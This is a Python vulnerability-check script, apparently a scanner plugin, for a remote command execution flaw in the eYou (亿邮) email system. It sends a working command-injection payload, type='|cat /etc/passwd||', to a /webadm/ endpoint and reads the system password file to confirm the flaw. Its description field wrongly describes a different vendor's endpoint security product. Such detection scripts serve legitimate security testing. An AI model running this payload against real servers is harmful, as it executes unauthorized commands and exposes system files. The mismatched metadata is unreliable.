# coding:utf-8
import socket
import requests
import warnings

warnings.filterwarnings('ignore')
vul_info = {
    "id":"10014",
    "name":"亿邮电子邮件系统 远程命令执行漏洞",
    "detail":"终端安全管理系统(天擎)奇安信终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。",
    "level":"高危",
    "type":"亿邮电子邮件系统 存在远程命令执行漏洞，攻击者可以执行任意命令",
    "port":"8443",
    "solution":"",
    "reference":"http://bbs.qcloud.com/thread-30706-1-1.html",
    "author":"system",
    "expand":"default"
}
def vul_result(code,message):
    return '{"code":"%d","info":"%s"}' % (code,message)
def alive_detect(ip, port, timeout):
    ak = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ak.settimeout(timeout)
    try:
        ak.connect((ip,port))
        ak.close()
        return 'UP'
    except Exception as e:
        return 'DOWN'

def vul_detect(ip, port, timeout=5):
    warnings.filterwarnings('ignore')
    if alive_detect(ip, int(port), timeout) == 'DOWN':
        return vul_result(2,'目标端口不可达')
    try:
        target = 'https://{}:{}/webadm/?q=moni_detail.do&action=gragh'.format(ip,port)
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "type='|cat /etc/passwd||'"
        response1 = requests.post(target, headers=headers, data=data, verify=False, timeout=timeout)
        if response1.status_code == 200 and 'root:x:0:0' in response1.text:
            return vul_result(1,'存在')
        else:
            return vul_result(0,'不存在')
    except Exception as e:
        return vul_result(2,e)





